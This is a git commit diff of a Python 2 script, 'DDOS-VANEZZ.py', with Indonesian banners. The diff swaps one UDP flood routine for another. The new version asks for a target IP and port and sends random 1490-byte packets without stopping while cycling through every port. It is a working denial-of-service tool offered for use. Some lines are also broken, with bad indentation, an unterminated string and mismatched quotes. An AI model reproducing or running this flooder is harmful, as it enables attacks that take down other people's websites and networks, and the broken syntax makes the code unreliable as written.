983fcc77ffa8dbbbd31364beffa00db8c27accef
VALWA-666 <150009895+VALWA-666@users.noreply.github.com>
2023-11-06 20:05:12 +0700

    DDOS-VANEZZ.py

--- DDOS-VANEZZ.py
+++ DDOS-VANEZZ.py
@@ -1,36 +1,51 @@
+import sys
+import os
 import time
 import socket
 import random
-import sys
-def usage():
-    print "-------------------PROFIL CREATOR SCRIPT TERMUX DDOS-------------------- "
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet HAY SAYANG KU !! ")
+print
+    print "-------------------PROFIL CREATOR SCRIPT BUG BOT DDOS-------------------- "
     print "NAMA KETUA KELOMPOK : VANNEZZ × JAVA 
     print "NOMOR WHATSAPP      : +6285171197674 / REPUBLIK INDONESIA'
     print "ORGANISASI          : DARK HAT YOGYAKARTA"
     print "------------TEAM SECURITY REPUBLIK INDONESIA NEGARA PANCASILA------------"
-def flood(victim, vport, duration):
-    # SC BY : VANNEZZ
-    # UDAH PADA PAHAM KAN CARA JALAN NYA ?
-client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # 20000 representasi satu byte ke server
-    bytes = random._urandom(20000)
-    timeout =  time.time() + duration
-    sent = 3000
+print
+ip = raw_input("IP / HOST TARGET WEB : ")
+port = input("PORT WEB        : ")
 
-    while 1:
-        if time.time() > timeout:
-            break
-        else:
-            pass
-        client.sendto(bytes, (victim, vport))
-        sent = sent + 1
-        print "\033[1;91MEMULAI \033[1;32m%s \033[1;91MENGIRIM KOUTA AXIS \033[1;32m%s \033[1;91KE PORT \033[1;32m%s "%(sent, victim, vport)
-def main():
-    print len(sys.argv)
-    if len(sys.argv) != 4:
-        usage()
-    else:
-        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
-
-if __name__ == '__main__':
-    main()
+os.system("clear")
+os.system("figlet Mengirim Bug Bot")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Mengirim %s Bug Bot HW %s Ke Website:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
